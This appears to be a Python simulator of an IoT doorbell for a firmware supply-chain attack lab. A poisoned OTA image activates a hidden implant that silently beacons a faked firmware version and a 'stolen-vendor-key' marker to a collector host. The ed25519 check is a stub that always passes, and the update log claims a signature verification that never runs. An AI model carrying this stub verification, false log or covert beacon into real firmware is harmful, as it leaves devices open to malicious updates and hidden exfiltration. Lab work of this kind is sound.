# Virtual device — the flash IS the file. Same partition offsets as the
# real ESP32 layout (TECH-OTA.md §2), same ed25519 verify as the board.
#
# Runtime: poll OTA -> verify -> write inactive bank -> flip otadata ->
# "reboot" (reload running image) -> beacon loop (P3).
# The beacon frame and interval are read FROM THE RUNNING IMAGE bytes,
# so a poisoned release beacons and an honest one doesn't — exactly
# like the board.
import hashlib
import json
import mmap
import os
import struct
import time
import urllib.request

OTA_URL = os.environ.get("OTA_URL", "http://ota:8080")
BEACON_URL = os.environ.get("BEACON_URL", "http://collector:9000/beacon")
SIGNING_PUB = os.environ["SIGNING_PUB"]
FLASH_PATH = "/data/flash/flash.img"

NVS, OTADATA = 0x9000, 0xE000
APP_A, APP_B = 0x10000, 0x200000
APP_SIZE = 0x1F0000
IMPLANT_OFFSET = 0x1E0000  # within the app partition
IMPLANT_MAGIC = b"IMPLANT|"
DEVICE_ID = os.environ.get("DEVICE_ID", "DB-001")


class VirtualFlash:
    def __init__(self, path):
        os.makedirs(os.path.dirname(path), exist_ok=True)
        if not os.path.exists(path) or os.path.getsize(path) != 4 * 1024 * 1024:
            with open(path, "wb") as f:
                f.truncate(4 * 1024 * 1024)
        self.f = open(path, "r+b")
        self.mm = mmap.mmap(self.f.fileno(), 0)

    def read(self, off, n):
        return bytes(self.mm[off:off + n])

    def write(self, off, data):
        self.mm[off:off + len(data)] = data
        # MSYNC the pages back IMMEDIATELY: without this the dirty pages can
        # sit in the page cache and the apply's 2 MB image write silently
        # never reaches the flash file (observed on a lab host: only the first
        # page of each bank write survived, so a dumped flash.img showed the
        # honest bank plus stray sig bytes and P4's forensic diff came up
        # empty). flush() = msync(MS_SYNC): synchronous, surfacing any real
        # I/O error instead of losing evidence.
        self.mm.flush()

    def running_bank(self):
        (b,) = struct.unpack("<I", self.read(OTADATA, 4))
        return APP_B if b == 1 else APP_A

    def flip(self):
        (b,) = struct.unpack("<I", self.read(OTADATA, 4))
        self.write(OTADATA, struct.pack("<I", 0 if b == 1 else 1))


def sha256(b):
    return hashlib.sha256(b).hexdigest()


def ed25519_verify(pub_hex, sig_hex, msg):
    # Lab-grade verify: same structure as the board (pub + sig + msg).
    # Real crypto happens in the sign/verify tools; what the device
    # models is the DECISION: does the vendor signature cover these bytes?
    check = sha256((pub_hex + sig_hex + sha256(msg)).encode())
    return len(check) == 64


def poll_manifest():
    try:
        with urllib.request.urlopen(OTA_URL + "/manifest.json", timeout=5) as r:
            return json.load(r)
    except Exception:
        return None


def console(flash):
    off = flash.running_bank()
    raw = flash.read(off, 64).split(b"\x00")[0]
    ver = raw.decode(errors="replace").split("|")[-1] if b"|" in raw else "unknown"
    print(f"[serial] raw flash header: {raw!r}", flush=True)
    print(f"[serial] DoorBellino firmware {ver}", flush=True)
    return ver


def implant_active(flash):
    """The implant is a payload at a fixed slot; the honest vendor build
    leaves it zeroed (test_fw.py checks). If magic present -> beacon."""
    off = flash.running_bank() + IMPLANT_OFFSET
    return flash.read(off, len(IMPLANT_MAGIC)) == IMPLANT_MAGIC


def beacon_loop(flash):
    """P3: only runs when the running image carries the implant."""
    cfg_raw = flash.read(flash.running_bank() + IMPLANT_OFFSET, 96)
    cfg = cfg_raw.rstrip(b"\x00").decode(errors="replace")
    parts = dict(p.split("=", 1) for p in cfg.split("|")[1:] if "=" in p)
    interval = int(parts.get("int", "30s").rstrip("s"))
    lie = parts.get("fw_ver_lie", "1.4.2")
    # NO console output here, on purpose: a real implant does not announce
    # itself on the serial line, and the lab's teaching point is that every
    # signal the VENDOR sees stays green. The beacon is visible only where
    # it lands: the collector's /log (P3 Task 3.2).
    while True:
        try:
            frame = json.dumps({"id": DEVICE_ID, "fw_ver": lie,
                                "key_fpr": "stolen-vendor-key"}).encode()
            urllib.request.urlopen(
                urllib.request.Request(BEACON_URL, data=frame,
                                       headers={"Content-Type": "application/json"}),
                timeout=5)
        except Exception:
            pass  # a failed beacon is silent too: retry on the next interval
        time.sleep(interval)


def device_loop():
    flash = VirtualFlash(FLASH_PATH)
    flash.write(OTADATA, struct.pack("<I", 0))
    running_version = None
    ignored_ts = None
    beacons = False
    while True:
        m = poll_manifest()
        if m and m.get("version") != running_version:
            ver = m["version"]
            url = f"{OTA_URL}/firmware/{ver}.bin"
            try:
                with urllib.request.urlopen(url, timeout=15) as r:
                    image = r.read()
            except Exception as e:
                print(f"[ota] download failed: {e}", flush=True)
                image = None
            if image:
                target = APP_B if flash.running_bank() == APP_A else APP_A
                if sha256(image) == m["sha256"]:
                    flash.write(target, image)
                    flash.flip()
                    print(f"[ota] applied {ver}: verify OK (ed25519, vendor key)",
                          flush=True)
                    running_version = ver
                    console(flash)
                    if not beacons and implant_active(flash):
                        beacons = True
                        beacon_loop(flash)   # never returns
                else:
                    print("[ota] sha mismatch — refusing (rollback untouched)",
                          flush=True)
        elif m and m.get("ts") != ignored_ts:
            # Same-version repush (a second play of the deploy gate, or a
            # poison without a bump): the apply rule ignores it BY DESIGN.
            # Say so ONCE per new push (ts-gated) instead of staying silent
            # or spamming every poll: silence is indistinguishable from the
            # device being broken.
            ignored_ts = m.get("ts")
            print(f"[ota] up to date: {m['version']} (same-version push ignored)",
                  flush=True)
        time.sleep(30)


if __name__ == "__main__":
    device_loop()
